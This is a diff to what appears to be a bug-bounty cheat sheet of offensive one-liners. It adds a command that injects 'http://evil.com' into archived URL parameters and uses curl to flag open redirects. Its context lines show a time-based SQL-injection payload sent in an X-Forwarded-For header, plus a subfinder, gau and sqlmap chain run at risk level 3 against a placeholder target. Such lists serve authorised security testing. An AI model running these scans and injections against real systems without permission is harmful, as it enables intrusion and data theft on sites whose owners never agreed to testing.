@@ -45,6 +45,11 @@ cat domain.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),slee
 6. HTTPX       : https://github.com/projectdiscovery/httpx
 
 ## OneLiner
+
+```
+waybackurls TARGET.COM | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done
+```
+
 ```
 subfinder -d http://TARGET.com -silent -all | gau - blacklist ttf,woff,svg,png | sort -u | gf sqli >gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli_report.txt
 ```
